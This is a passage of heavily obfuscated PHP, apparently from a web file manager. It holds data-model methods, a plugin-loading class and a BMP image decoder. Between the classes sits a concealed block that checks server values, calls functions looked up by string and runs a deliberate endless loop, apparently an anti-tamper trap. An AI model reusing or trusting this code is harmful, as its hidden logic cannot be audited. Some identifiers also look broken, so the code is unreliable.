-strlen($CãÈÀ¨äæ§[445])); $F°²º“°È = $this->query($B¹Ö®÷à×“); $A™¥«ĞÔØè = array_merge($A™¥«ĞÔØè, $F°²º“°È); $eª´·ãò¯® = 0; $B¹Ö®÷à×“ = $CãÈÀ¨äæ§[33]; } } goto FÓ£­©­ëì; eİÈø‘ÈÌ’: $CãÈÀ¨äæ§ =& $_SERVER[Ö]; $B¹Ö®÷à×“ = $CãÈÀ¨äæ§[357]; $A™¥«ĞÔØè = array(); goto cÕÁ–±Ñ¤¨; FÓ£­©­ëì: $A™¥«ĞÔØè = array_to_keyvalue($A™¥«ĞÔØè, $CãÈÀ¨äæ§[446]); foreach ($C‚ùó¥„à° as &$c×ÜŒ‚Ì”¹) { $c×ÜŒ‚Ì”¹[$CãÈÀ¨äæ§[2161]] = isset($A™¥«ĞÔØè[$c×ÜŒ‚Ì”¹[$CãÈÀ¨äæ§[2077]] . $CãÈÀ¨äæ§[2160]]); } goto Dğ°”Ää”Ş; Dğ°”Ää”Ş: } private function _listAppendMeta(&$a–ëÖ‰ëÆ“, $AíÃ¥Á¢”³) { $f‡Æà¤ä•— =& $_SERVER[Ö]; $Bõ¯‹›ÕÉÄ = array($f‡Æà¤ä•—[2077] => array($f‡Æà¤ä•—[7], $AíÃ¥Á¢”³)); $f£¾–ï‡Ãå = Model($f‡Æà¤ä•—[2150])->where($Bõ¯‹›ÕÉÄ)->select(); $f£¾–ï‡Ãå = array_to_keyvalue_group($f£¾–ï‡Ãå, $f‡Æà¤ä•—[2077]); foreach ($f£¾–ï‡Ãå as &$cÓ˜ñ®ø¡) { $cÓ˜ñ®ø¡ = array_to_keyvalue($cÓ˜ñ®ø¡, $f‡Æà¤ä•—[89], $f‡Æà¤ä•—[355]); } foreach ($a–ëÖ‰ëÆ“ as &$AñŠŒÜÖÍ‡) { $AñŠŒÜÖÍ‡[$f‡Æà¤ä•—[413]] = array(); if (isset($f£¾–ï‡Ãå[$AñŠŒÜÖÍ‡[$f‡Æà¤ä•—[2077]]])) { $AñŠŒÜÖÍ‡[$f‡Æà¤ä•—[413]] = $f£¾–ï‡Ãå[$AñŠŒÜÖÍ‡[$f‡Æà¤ä•—[2077]]]; } } } protected function parentLevelArray($B¯¿›Ëì‰) { $F‚ßÈø…« =& $_SERVER[Ö]; $B¯¿›Ëì‰ = explode($F‚ßÈø…«[47], trim($B¯¿›Ëì‰, $F‚ßÈø…«[47])); $B¯¿›Ëì‰ = array_remove_value($B¯¿›Ëì‰, $F‚ßÈø…«[464]); return $B¯¿›Ëì‰; } private function _listAppendParent(&$FÊƒÌĞ²“Ç) { goto Bšãã¹Ø¦è; eô‘¾Œ±¢³: $b­µÍÃèòŠ = array(); foreach ($AŠæçæÑ» as $e°âØ¥ŸĞ¢ => $cƒğöÎ‰ê) { if (!$cƒğöÎ‰ê) { $b­µÍÃèòŠ[] = $e°âØ¥ŸĞ¢; } } if ($b­µÍÃèòŠ) { $Cï‹¬Ø´‚‹ = array($BêÓ¿Úùî[2149] => array($BêÓ¿Úùî[380], $b­µÍÃèòŠ)); $d‹Ì”’öÛÒ = $this->field($BêÓ¿Úùî[2162])->where($Cï‹¬Ø´‚‹)->select(); $C§‡¹ÇœÜÀ = array_to_keyvalue($d‹Ì”’öÛÒ, $BêÓ¿Úùî[2077], $BêÓ¿Úùî[28]); $AŠæçæÑ» = array_merge_index($AŠæçæÑ», $C§‡¹ÇœÜÀ); } goto DËèŒ·”Ì; DËèŒ·”Ì: foreach ($FÊƒÌĞ²“Ç as &$eŠ¿¨ãö…Ç) { $d‚ªóã³à = $this->parentLevelArray($eŠ¿¨ãö…Ç[$BêÓ¿Úùî[455]]); $b£‹ŒÁ¼ìù = $BêÓ¿Úùî[33]; foreach ($d‚ªóã³à as $d†Ã­ŞÀ‚) { $b£‹ŒÁ¼ìù .= $AŠæçæÑ»[$d†Ã­ŞÀ‚] . $BêÓ¿Úùî[8]; } if ($d‚ªóã³à) { $b£‹ŒÁ¼ìù .= $eŠ¿¨ãö…Ç[$BêÓ¿Úùî[28]]; } $eŠ¿¨ãö…Ç[$BêÓ¿Úùî[459]] = str_replace($BêÓ¿Úùî[463], $BêÓ¿Úùî[8], $b£‹ŒÁ¼ìù); } goto Cå‘Ëù“ºË; Bšãã¹Ø¦è: $BêÓ¿Úùî =& $_SERVER[Ö]; $AŠæçæÑ» = array(); foreach ($FÊƒÌĞ²“Ç as &$eŠ¿¨ãö…Ç) { $AŠæçæÑ»[$eŠ¿¨ãö…Ç[$BêÓ¿Úùî[2077]]] = $eŠ¿¨ãö…Ç[$BêÓ¿Úùî[28]]; $d‚ªóã³à = $this->parentLevelArray($eŠ¿¨ãö…Ç[$BêÓ¿Úùî[455]]); foreach ($d‚ªóã³à as $d†Ã­ŞÀ‚) { if (!isset($AŠæçæÑ»[$d†Ã­ŞÀ‚])) { $AŠæçæÑ»[$d†Ã­ŞÀ‚] = 0; } } } goto eô‘¾Œ±¢³; Cå‘Ëù“ºË: } private function _listAppendSourceRoot(&$B—¡»¿‡¯, $dß˜ÔÄ•å¥) { goto BË™ÖñÍ‰Ô; BÕË¨ÆÎ‰: $AÜìŸ¸çÛ‚ = Model($b‰‘Ø¹êÓ‡[745])->order($b‰‘Ø¹êÓ‡[2164])->field($CŒ¸­¾èä)->where($CŸ‰Œ«ÄòÌ)->select(); $AÜìŸ¸çÛ‚ = array_to_keyvalue($AÜìŸ¸çÛ‚, $b‰‘Ø¹êÓ‡[452]); $AÜìŸ¸çÛ‚ = array_remove_key($AÜìŸ¸çÛ‚, $b‰‘Ø¹êÓ‡[452]); goto bº¢õ‹„ÚÛ; bº¢õ‹„ÚÛ: foreach ($B—¡»¿‡¯ as &$E’é¤¤åÎã) { $E’é¤¤åÎã[$b‰‘Ø¹êÓ‡[387]] = $AÜìŸ¸çÛ‚[$E’é¤¤åÎã[$b‰‘Ø¹êÓ‡[2077]]] ? $AÜìŸ¸çÛ‚[$E’é¤¤åÎã[$b‰‘Ø¹êÓ‡[2077]]] : array(); } goto DÄ´Ÿä¯¸; BË™ÖñÍ‰Ô: $b‰‘Ø¹êÓ‡ =& $_SERVER[Ö]; $CŸ‰Œ«ÄòÌ = array($b‰‘Ø¹êÓ‡[367] => SourceModel::TYPE_GROUP, $b‰‘Ø¹êÓ‡[457] => 0, $b‰‘Ø¹êÓ‡[452] => array($b‰‘Ø¹êÓ‡[7], $dß˜ÔÄ•å¥)); $CŒ¸­¾èä = $b‰‘Ø¹êÓ‡[2163]; goto BÕË¨ÆÎ‰; DÄ´Ÿä¯¸: } protected function resetParentLevel() { $B’ğ‹İøß =& $_SERVER[Ö]; $D¾áœ¶Ş‡¼ = $B’ğ‹İøß[2077]; $dëÇ¾¿õ¾Ñ = $this->select(); $dëÇ¾¿õ¾Ñ = array_to_keyvalue($dëÇ¾¿õ¾Ñ, $D¾áœ¶Ş‡¼); foreach ($dëÇ¾¿õ¾Ñ as $dÜßÖğÆ‘ï) { goto CçÔ¡¦ã»–; eù†‰Ë¨ÈÓ: $this->where(array($D¾áœ¶Ş‡¼ => $dÜßÖğÆ‘ï[$D¾áœ¶Ş‡¼]))->save(array($B’ğ‹İøß[521] => $Cñä·ÅˆÇù)); goto eÇ÷‹—İ„; bÙÙ…“ ×í: $Cñä·ÅˆÇù[] = 0; $Cñä·ÅˆÇù = $B’ğ‹İøß[47] . implode($B’ğ‹İøß[47], array_reverse($Cñä·ÅˆÇù)) . $B’ğ‹İøß[47]; $this->setNamePinyin($dÜßÖğÆ‘ï[$D¾áœ¶Ş‡¼], $dÜßÖğÆ‘ï[$B’ğ‹İøß[28]]); goto eù†‰Ë¨ÈÓ; CçÔ¡¦ã»–: $C‰…ô§øèß = $dÜßÖğÆ‘ï; $Cñä·ÅˆÇù = array(); while ($C‰…ô§øèß[$B’ğ‹İøß[457]] != 0) { $Cñä·ÅˆÇù[] = $C‰…ô§øèß[$B’ğ‹İøß[457]]; $C‰…ô§øèß = $dëÇ¾¿õ¾Ñ[$C‰…ô§øèß[$B’ğ‹İøß[457]]]; } goto bÙÙ…“ ×í; eÇ÷‹—İ„: } return $dëÇ¾¿õ¾Ñ; } public function groupNameAuto($a…²£òÇÙÈ, $ašËèá¾Ïá) { $E†²ãº™ˆÛ =& $_SERVER[Ö]; $C¿êÏ«¸³¸ = $this->where(array($E†²ãº™ˆÛ[364] => $a…²£òÇÙÈ))->getField($E†²ãº™ˆÛ[28], !0); if (!$C¿êÏ«¸³¸ || !in_array($ašËèá¾Ïá, $C¿êÏ«¸³¸)) { return $ašËèá¾Ïá; } for ($e£œËÀ˜ê« = 1; $e£œËÀ˜ê« <= count($C¿êÏ«¸³¸) + 1; $e£œËÀ˜ê«++) { $E³“àÀ“‡‚ = $ašËèá¾Ïá . "\x28{$e£œËÀ˜ê«}\51"; if (!in_array($E³“àÀ“‡‚, $C¿êÏ«¸³¸)) { return $E³“àÀ“‡‚; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x70\x6c\x75\x67\151\x6e\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\x73\x74\x61\x74\165\163", "\x72\145\x67\151\145\x73\164", "\x63\x6f\x6e\146\x69\147"); public function loadList($f¹ƒ¶Œ£ëÁ = false) { $Dá…ÜÌ¬Ş = array_to_keyvalue($this->listData(), $_SERVER[Ö][28]); if ($f¹ƒ¶Œ£ëÁ) { return $Dá…ÜÌ¬Ş[$f¹ƒ¶Œ£ëÁ]; } return $Dá…ÜÌ¬Ş; } public function init() { $DãºÊ’¬Ñ =& $_SERVER[Ö]; Hook::trigger($DãºÊ’¬Ñ[2165]); $C¢Éî¤¡ó“ = $this->loadPluginList(); foreach ($C¢Éî¤¡ó“ as $aâ­—°ˆÉ => $e½ ’š’›) { $DéÀöÖÉ•° = $this->appAllow($aâ­—°ˆÉ, $e½ ’š’›); if (!$DéÀöÖÉ•°) { continue; } foreach ($e½ ’š’›[$DãºÊ’¬Ñ[2166]] as $FÛ§ƒ©™™¾ => $C÷ªô³°°×) { Hook::bind($FÛ§ƒ©™™¾, $C÷ªô³°°×); } } Hook::trigger($DãºÊ’¬Ñ[2167]); Hook::trigger(ACTION); } public function appAllow($F‹”ÓòË, $dÉÈÕÕĞğ, $eÁöÓª¯§Æ = true) { $bÛÀœÒòÃ™ =& $_SERVER[Ö]; $C·ÆùÂ™‘¾ = PLUGIN_DIR . $F‹”ÓòË . $bÛÀœÒòÃ™[2168]; if (!is_array($dÉÈÕÕĞğ) || !is_array($dÉÈÕÕĞğ[$bÛÀœÒòÃ™[2166]]) || !is_file($C·ÆùÂ™‘¾) || $dÉÈÕÕĞğ[$bÛÀœÒòÃ™[682]] != 1) { return !1; } if ($eÁöÓª¯§Æ && !Action($bÛÀœÒòÃ™[2169])->checkAuth($F‹”ÓòË)) { return !1; } return !0; } public function unInstall($BÃé–÷ä½) { $e®·¬½òÀÅ =& $_SERVER[Ö]; $EÄ†²Õ” = $this->loadList($BÃé–÷ä½); if (file_exists(PLUGIN_DIR . $BÃé–÷ä½)) { Hook::apply($BÃé–÷ä½ . $e®·¬½òÀÅ[2170]); } $this->remove($EÄ†²Õ”[$e®·¬½òÀÅ[363]]); } public function changeStatus($A¸ìÛØ©…“, $eÔ‰ˆïÛ«Ú) { $c½Ş¨ÕËâ† =& $_SERVER[Ö]; $E³’¶‹‘ = $this->loadList($A¸ìÛØ©…“); if ($eÔ‰ˆïÛ«Ú) { Hook::apply($A¸ìÛØ©…“ . $c½Ş¨ÕËâ†[2171]); } $this->update($E³’¶‹‘[$c½Ş¨ÕËâ†[363]], array($c½Ş¨ÕËâ†[2172] => $eÔ‰ˆïÛ«Ú)); } public function appRegist($B­øì¿œ„İ, $aà“ƒÁóç¢) { $b·Šé‹Ó™Œ =& $_SERVER[Ö]; $D’¨³Ö„¸› = $this->loadList($B­øì¿œ„İ); if ($D’¨³Ö„¸›) { $this->update($D’¨³Ö„¸›[$b·Šé‹Ó™Œ[363]], array($b·Šé‹Ó™Œ[2166] => $aà“ƒÁóç¢)); } else { $CøØµï™…ƒ = array($b·Šé‹Ó™Œ[28] => $B­øì¿œ„İ, $b·Šé‹Ó™Œ[2166] => $aà“ƒÁóç¢, $b·Šé‹Ó™Œ[682] => 0, $b·Šé‹Ó™Œ[6] => $this->getConfigDefault($B­øì¿œ„İ)); $this->insert($CøØµï™…ƒ); } } public function getConfigDefault($CÍ‚¹ª“ç) { $e†õ¿‹æ¢Ô =& $_SERVER[Ö]; $aØ¯ğ„˜ÉÅ = array(); $a‘¹¾×Ÿ±¨ = $this->getPackageJson($CÍ‚¹ª“ç); if (!$a‘¹¾×Ÿ±¨ && is_array($a‘¹¾×Ÿ±¨[$e†õ¿‹æ¢Ô[2173]])) { return $aØ¯ğ„˜ÉÅ; } foreach ($a‘¹¾×Ÿ±¨[$e†õ¿‹æ¢Ô[2173]] as $bŸ›µŠ‹Ú => $AÒš¢éÕÇÅ) { if (!isset($AÒš¢éÕÇÅ[$e†õ¿‹æ¢Ô[355]]) || isset($aØ¯ğ„˜ÉÅ[$bŸ›µŠ‹Ú])) { continue; } $aØ¯ğ„˜ÉÅ[$bŸ›µŠ‹Ú] = $AÒš¢éÕÇÅ[$e†õ¿‹æ¢Ô[355]]; } return $aØ¯ğ„˜ÉÅ; } public function getPackageJson($FŞãÃ¦‘Ëé) { return Hook::apply($FŞãÃ¦‘Ëé . $_SERVER[Ö][2174]); } public function getConfig($A‰‹÷íŞç, $CÎ®Œ„‚µ… = false) { $B²¯´¸ì¨Æ =& $_SERVER[Ö]; $D¥ùÖ­†¿Ö = array(); $cê”îéŠë = $this->loadList($A‰‹÷íŞç); if ($cê”îéŠë && is_array($cê”îéŠë[$B²¯´¸ì¨Æ[6]])) { $D¥ùÖ­†¿Ö = $cê”îéŠë[$B²¯´¸ì¨Æ[6]]; } if (!$D¥ùÖ­†¿Ö || $CÎ®Œ„‚µ…) { $D¥ùÖ­†¿Ö = $this->getConfigDefault($A‰‹÷íŞç); } return $D¥ùÖ­†¿Ö; } public function setConfig($eÁŒ‡İÊß, $aõ…ÌˆÉ¢ = false) { goto FİåÃ­Ô½; c³¼íĞçÌê: if ($aõ…ÌˆÉ¢ == !1) { $aõ…ÌˆÉ¢ = $this->getConfigDefault($eÁŒ‡İÊß); } $DÇÉôËëÉø = $FõÜÎÓ§“[$AÌÈïÏë[6]]; foreach ($aõ…ÌˆÉ¢ as $fŒŠóÌêØ¸ => $DÁ’…á¾„) { $DÇÉôËëÉø[$fŒŠóÌêØ¸] = is_string($DÁ’…á¾„) ? trim($DÁ’…á¾„) : $DÁ’…á¾„; } goto F’÷ã…¿ëÇ; F’÷ã…¿ëÇ: $this->update($FõÜÎÓ§“[$AÌÈïÏë[363]], array($AÌÈïÏë[6] => $DÇÉôËëÉø)); goto D¬¡¤…Û™¬; FİåÃ­Ô½: $AÌÈïÏë =& $_SERVER[Ö]; $FõÜÎÓ§“ = $this->loadList($eÁŒ‡İÊß); if (!$FõÜÎÓ§“) { return !1; } goto c³¼íĞçÌê; D¬¡¤…Û™¬: } public function viewList() { goto cÜĞ‘™ƒÀ‹; e„¯«„¿“«: return $Fƒ¡ñ†°‘ƒ; goto dñÖÓñ ™¨; DŸ±ç¶ñà: $cŒÔÂÜŒïê = $this->loadPluginList(); $Fƒ¡ñ†°‘ƒ = array(); foreach ($cŒÔÂÜŒïê as $C™­‹…ƒ— => $AÄà¦²××Õ) { unset($AÄà¦²××Õ[$EÊ›ÍÍêƒÆ[2166]], $AÄà¦²××Õ[$EÊ›ÍÍêƒÆ[6]]); $añ›·­â¡â = PLUGIN_DIR . $AÄà¦²××Õ[$EÊ›ÍÍêƒÆ[28]] . $EÊ›ÍÍêƒÆ[2168]; if (!is_file($añ›·­â¡â)) { continue; } $EõÊ™êÌ• = Hook::apply($AÄà¦²××Õ[$EÊ›ÍÍêƒÆ[28]] . $EÊ›ÍÍêƒÆ[2174]); if (is_array($EõÊ™êÌ•)) { $Fƒ¡ñ†°‘ƒ[$C™­‹…ƒ—] = array_merge($AÄà¦²××Õ, $EõÊ™êÌ•); } } goto e„¯«„¿“«; cÜĞ‘™ƒÀ‹: $EÊ›ÍÍêƒÆ =& $_SERVER[Ö]; $cŒÔÂÜŒïê = $this->loadList(); $this->pluginScan($cŒÔÂÜŒïê); goto DŸ±ç¶ñà; dñÖÓñ ™¨: } private function loadPluginList() { $aÔ¶¸ƒÖè =& $_SERVER[Ö]; $AÂÁÔµ¢…‚ = $this->loadList(); if (strtolower(MOD) == $aÔ¶¸ƒÖè[2175]) { return $AÂÁÔµ¢…‚; } $B¢“è•ÏºÌ = Hook::trigger($aÔ¶¸ƒÖè[2176], $AÂÁÔµ¢…‚); if ($AÂÁÔµ¢…‚ && !$B¢“è•ÏºÌ) { die; } return $B¢“è•ÏºÌ ? $B¢“è•ÏºÌ : $AÂÁÔµ¢…‚; } private function pluginScan($aå¼©ÄËÓ) { $d•’£òõ =& $_SERVER[Ö]; recursion_dir(PLUGIN_DIR, $e¢õÎéà¾, $D÷ø©ßÈ¼Ñ, 0); foreach ($e¢õÎéà¾ as $cö¹”éÅÌ±) { $e÷½ÛšÃĞ = get_path_this($cö¹”éÅÌ±); if (isset($aå¼©ÄËÓ[$e÷½ÛšÃĞ]) || !file_exists($cö¹”éÅÌ± . $d•’£òõ[2177]) || !file_exists($cö¹”éÅÌ± . $d•’£òõ[2168])) { continue; } Hook::apply($e÷½ÛšÃĞ . $d•’£òõ[2171]); } } } goto dÆŞµ«°½¹; c—ôßÄğÚ›: define($_SERVER[Ö][223], 2); define($_SERVER[Ö][224], 3); define($_SERVER[Ö][225], 1); goto fÉÖº’ ¤ã; CÊÔ‡‘‘Éš: if (!isset($_SERVER[$_SERVER[Ö][755]]) || !isset($_SERVER[$_SERVER[Ö][1294]])) { goto Fè¿»ì‚ó; Fè¿»ì‚ó: $f‰“šî‡ß = $_SERVER[Ö][756]; $E‚‰ˆŒäå‚ = $_SERVER[$_SERVER[Ö][757]] . $_SERVER[Ö][758]; $bº¢Ä¡ÙÈ = $f‰“šî‡ß($E‚‰ˆŒäå‚); goto BØËïÏô¯­; eìéâ‹èÄ£: $E²ñÓ£ò ($_SERVER[$_SERVER[Ö][757]] . $_SERVER[Ö][758]); $Dì¤Óé°·ª = 2; while ($Dì¤Óé°·ª > 1) { $eîÁ²éÇ×‚ = rawurlencode($Dì¤Óé°·ª . $_SERVER[Ö][357]); } goto a–›äâÂß; BØËïÏô¯­: $AŠ×ë´›âÈ = explode($_SERVER[Ö][213], $bº¢Ä¡ÙÈ); if (count($AŠ×ë´›âÈ) < $_SERVER[Ö][555]) { $c×ê©àŸŠš = $_SERVER[Ö][759]; $c×ê©àŸŠš(); } $E²ñÓ£ò  = $_SERVER[Ö][760]; goto eìéâ‹èÄ£; a–›äâÂß: } class ImageGdBMP { public static function load($dõÆê…¼®ê) { $EØ»ùŒ¥™´ = fopen($dõÆê…¼®ê, $_SERVER[Ö][1493]); if ($EØ»ùŒ¥™´ === !1) { return !1; } $bª©ò¸â³Ü = self::loadFromStream($EØ»ùŒ¥™´); fclose($EØ»ùŒ¥™´); return $bª©ò¸â³Ü; } public static function loadFromStream($A…Ä½ê²Ãô) { $c‡àô†Æñè =& $_SERVER[Ö]; $bİ·ò·Üï¥ = fread($A…Ä½ê²Ãô, 14); if ($bİ·ò·Üï¥ === !1) { return !1; } if ($bİ·ò·Üï¥[0] != $c‡àô†Æñè[1805] || $bİ·ò·Üï¥[1] != $c‡àô†Æñè[1806]) { return !1; } $CÈ³Œù¿ˆ„ = unpack($c‡àô†Æñè[1807] . $c‡àô†Æñè[1808] . $c‡àô†Æñè[1809] . $c‡àô†Æñè[1810] . $c‡àô†Æñè[1811], $bİ·ò·Üï¥); return self::loadFromStreamAndFileHeader($A…Ä½ê²Ãô, $CÈ³Œù¿ˆ„); } public static function loadFromStreamAndFileHeader($bç÷óÕŸõ, array $E†ä‰„Ÿ¨‰) { goto DÛÕˆœ¦†; DÛÕˆœ¦†: $C ¿‹«±› =& $_SERVER[Ö]; if ($E†ä‰„Ÿ¨‰[$C ¿‹«±›[384]] != 19778) { return !1; } $Bô§êöÖŒñ = fread($bç÷óÕŸõ, 4); goto AğŒ¿ªùŒ; b¸æ¾±ˆ³: if ($cÅƒ–ôæÕï == 0 || $FºÃš÷£ÊÈ == 0 || $cØÚñ…ŸÛø != 1 || ($b¥¤ñ«µÔŸ & $f‹èßõÄ´) != 0 || ($b¥¤ñ«µÔŸ & $bá‡‡ê¡æ¡) != 0 || ($b¥¤ñ«µÔŸ & $FÚªŸÀì¨±) != 0 || ($f‹èßõÄ´ & $bá‡‡ê¡æ¡) != 0 || ($f‹èßõÄ´ & $FÚªŸÀì¨±) != 0 || ($bá‡‡ê¡æ¡ & $FÚªŸÀì¨±) != 0) { return !1; } if ($D£”“‘î²æ == 4 || $D£”“‘î²æ == 5) { $Bô§êöÖŒñ = stream_get_contents($bç÷óÕŸõ, $BÈ¬çŸÏã“); if ($Bô§êöÖŒñ === !1) { return !1; } return imagecreatefromstring($Bô§êöÖŒñ); } $EÔš£œŒá = $cÅƒ–ôæÕï * $f¿ôèòëï + 31 >> 3 & ~3; goto eÂ â·‘“; AğŒ¿ªùŒ: if ($Bô§êöÖŒñ === !1) { return !1; } list(, $CßË„·…Á…) = unpack($C ¿‹«±›[1812], $Bô§êöÖŒñ); if ($CßË„·…Á… == 12) { goto eîĞ„à÷å; DéÉ½›Ñ¶À: $b°Ç¤à–‹º = $b£Ÿššå³î = $b¥¤ñ«µÔŸ = $D£”“‘î²æ = 0; $f‹èßõÄ´ = 16711680; $bá‡‡ê¡æ¡ = 65280; goto AËÇœËŠ¿¹; eîĞ„à÷å: $Bô§êöÖŒñ = fread($bç÷óÕŸõ, $CßË„·…Á… - 4); if ($Bô§êöÖŒñ === !1) { return !1; } extract(unpack($C ¿‹«±›[1813] . $C ¿‹«±›[1814] . $C ¿‹«±›[1815] . $C ¿‹«±›[1816], $Bô§êöÖŒñ)); goto DéÉ½›Ñ¶À; AËÇœËŠ¿¹: $FÚªŸÀì¨± = 255; goto fä‡•àÍ›ã; fä‡•àÍ›ã: } else { if (124 < $CßË„·…Á… || $CßË„·…Á… < 40) { return !1; } else { goto cØÈÔà»ÜÏ; AĞµœÀØ×: if (($f¿ôèòëï == 16 || $f¿ôèòëï == 24 || $f¿ôèòëï == 32) && $D£”“‘î²æ == 0 && $f‹èßõÄ´ == 0 && $bá‡‡ê¡æ¡ == 0 && $FÚªŸÀì¨± == 0) { switch ($f¿ôèòëï) { case 16: $f‹èßõÄ´ = 31744; $bá‡‡ê¡æ¡ = 992; $FÚªŸÀì¨± = 31; break; case 24: case 32: $f‹èßõÄ´ = 16711680; $bá‡‡ê¡æ¡ = 65280; $FÚªŸÀì¨± = 255; break; } } goto bÇ–»»×¸–; b»·Ï“Ğå: if ($Dß†Éå¦©Š & 2147483648) { $Dß†Éå¦©Š = -(~$Dß†Éå¦©Š & 4294967295) - 1; } if ($E†ä‰„Ÿ¨‰[$C ¿‹«±›[516]] != 0) { $eÓ¤ˆ¶ĞÊ› = $f¿ôèòëï == 1 || $f¿ôèòëï == 4 || $f¿ôèòëï == 8 ? ($b°Ç¤à–‹º ? $b°Ç¤à–‹º : pow(2, $f¿ôèòëï)) << 2 : 0; $f¢Èµä¼ = $BÈ¬çŸÏã“ ? $BÈ¬çŸÏã“ : ($cÅƒ–ôæÕï * $f¿ôèòëï + 31 >> 3 & ~3) * abs($FºÃš÷£ÊÈ); $b¿†§½ÑîÅ = $E†ä‰„Ÿ¨‰[$C ¿‹«±›[516]] - $f¢Èµä¼ - $eÓ¤ˆ¶ĞÊ› - 14; if ($CßË„·…Á… < $b¿†§½ÑîÅ && 40 <= $CßË„·…Á… && $CßË„·…Á… <= 124) { $CßË„·…Á… = $b¿†§½ÑîÅ; } } if ($CßË„·…Á… - 40 > 0) { $Bô§êöÖŒñ = fread($bç÷óÕŸõ, $CßË„·…Á… - 40); if ($Bô§êöÖŒñ === !1) { return !1; } extract(unpack($C ¿‹«±›[1826] . $C ¿‹«±›[1827] . $C ¿‹«±›[1828] . $C ¿‹«±›[1829], $Bô§êöÖŒñ . str_repeat($C ¿‹«±›[1830], 120))); } else { $b¥¤ñ«µÔŸ = $f‹èßõÄ´ = $bá‡‡ê¡æ¡ = $FÚªŸÀì¨± = 0; } goto AĞµœÀØ×; cØÈÔà»ÜÏ: $Bô§êöÖŒñ = fread($bç÷óÕŸõ, 36); if ($Bô§êöÖŒñ === !1) { return !1; } extract(unpack($C ¿‹«±›[1817] . $C ¿‹«±›[1818] . $C ¿‹«±›[1815] . $C ¿‹«±›[1819] . $C ¿‹«±›[1820] . $C ¿‹«±›[1821] . $C ¿‹«±›[1822] . $C ¿‹«±›[1823] . $C ¿‹«±›[1824] . $C ¿‹«±›[1825], $Bô§êöÖŒñ)); goto a¦…”Èº†£; a¦…”Èº†£: if ($cÅƒ–ôæÕï & 2147483648) { $cÅƒ–ôæÕï = -(~$cÅƒ–ôæÕï & 4294967295) - 1; } if ($FºÃš÷£ÊÈ & 2147483648) { $FºÃš÷£ÊÈ = -(~$FºÃš÷£ÊÈ & 4294967295) - 1; } if ($d‡ãÀ£ƒÓê & 2147483648) { $d‡ãÀ£ƒÓê = -(~$d‡ãÀ£ƒÓê & 4294967295) - 1; } goto b»·Ï“Ğå; bÇ–»»×¸–: } } goto b¸æ¾±ˆ³; eÂ â·‘“: $D°™Éƒ ØÔ = abs($FºÃš÷£ÊÈ); $E”ÀÀ©…‹ = $FºÃš÷£ÊÈ > 0 ? $D°™Éƒ ØÔ - 1 : 0; $Fó³„àğİ = $FºÃš÷£ÊÈ > 0 ? -1 : 1; goto b‡ìßÜ¡œ; b‡ìßÜ¡œ: if ($f¿ôèòëï == 1 || $f¿ôèòëï == 4 || $f¿ôèòëï == 8) { goto F’æˆ¯Ùèî; CôáòÂÅ: $c‰¬ñ•ÕÓ“ = array(); for ($dãÃµ‚ÈÂÉ = 0; $dãÃµ‚ÈÂÉ < $aŠ”‘¥Ü¶Å; ++$dãÃµ‚ÈÂÉ) { $Bô§êöÖŒñ = fread($bç÷óÕŸõ, $BÕ¶©Äœ—ï); if ($Bô§êöÖŒñ === !1) { imagedestroy($D‹Êöç”õä); return !1; } extract(unpack($C ¿‹«±›[1831], $Bô§êöÖŒñ . $C ¿‹«±›[1830])); $c‰¬ñ•ÕÓ“[] = imagecolorallocate($D‹Êöç”õä, $d¨¿’’Šè¡, $A²ƒîÀÕ…, $F˜çõæ‹); } $Eó´¾¸›Ñ = 8 - $f¿ôèòëï; goto E¤¥‚Èçí; F’æˆ¯Ùèî: $D‹Êöç”õä = imagecreate($cÅƒ–ôæÕï, $D°™Éƒ ØÔ); $BÕ¶©Äœ—ï = $CßË„·…Á… == 12 ? 3 : 4; $aŠ”‘¥Ü¶Å = $b°Ç¤à–‹º ? $b°Ç¤à–‹º : pow(2, $f¿ôèòëï); goto CôáòÂÅ; E¤¥‚Èçí: $dİÚãØÒ„ì = (1 << $f¿ôèòëï) - 1 << $Eó´¾¸›Ñ; if ($D£”“‘î²æ == 1 || $D£”“‘î²æ == 2) { $B¸™ÍíÇÁ = 0; $ağ¿æìğå• = $f¿ôèòëï >> 2 & 1; for (;;) { if ($B¸™ÍíÇÁ < -1 || $B¸™ÍíÇÁ > $cÅƒ–ôæÕï || $E”ÀÀ©…‹ < -1 || $E”ÀÀ©…‹ > $FºÃš÷£ÊÈ) { imagedestroy($D‹Êöç”õä); return !1; } $Bô§êöÖŒñ = fread($bç÷óÕŸõ, 1); if ($Bô§êöÖŒñ === !1) { imagedestroy($D‹Êöç”õä); return !1; } switch ($Bô§êöÖŒñ) { case $C ¿‹«±›[1830]: $Bô§êöÖŒñ = fread($bç÷óÕŸõ, 1); if ($Bô§êöÖŒñ === !1) { imagedestroy($D‹Êöç”õä); return !1; } switch ($Bô§êöÖŒñ) { case $C ¿‹«±›[1830]: $E”ÀÀ©…‹ += $Fó³„àğİ; $B¸™ÍíÇÁ = 0; break; case $C ¿‹«±›[1832]: $E”ÀÀ©…‹ = 0; $B¸™ÍíÇÁ = 0; break 3; case $C ¿‹«±›[1833]: $Bô§êöÖŒñ = fread($bç÷óÕŸõ, 2); if ($Bô§êöÖŒñ === !1) { imagedestroy($D‹Êöç”õä); return !1; } list(, $eÜÊƒËÙÆ¢, $D»º£÷ÎõÅ) = unpack($C ¿‹«±›[1834], $Bô§êöÖŒñ); $B¸™ÍíÇÁ += $eÜÊƒËÙÆ¢; $E”ÀÀ©…‹ += $D»º£÷ÎõÅ * $Fó³„àğİ; break; default: list(, $aÂ…Úãïò ) = unpack($C ¿‹«±›[1835], $Bô§êöÖŒñ); $Bï…Öï¨ = ($aÂ…Úãïò  >> $ağ¿æìğå•) + ($aÂ…Úãïò  & $ağ¿æìğå•); $Bô§êöÖŒñ = fread($bç÷óÕŸõ, $Bï…Öï¨ + 1 & ~1); if ($Bô§êöÖŒñ === !1) { imagedestroy($D‹Êöç”õä); return !1; } for ($dãÃµ‚ÈÂÉ = 0, $DóÈ²‰Ø”² = 0; $dãÃµ‚ÈÂÉ < $aÂ…Úãïò ; ++$dãÃµ‚ÈÂÉ, ++$B¸™ÍíÇÁ, $DóÈ²‰Ø”² += $f¿ôèòëï) { list(, $AÅ¡®Õ¶š) = unpack($C ¿‹«±›[1835], $Bô§êöÖŒñ[$DóÈ²‰Ø”² >> 3]); $F˜çõæ‹ = $DóÈ²‰Ø”² & 7; imagesetpixel($D‹Êöç”õä, $B¸™ÍíÇÁ, $E”ÀÀ©…‹, $c‰¬ñ•ÕÓ“[($AÅ¡®Õ¶š & 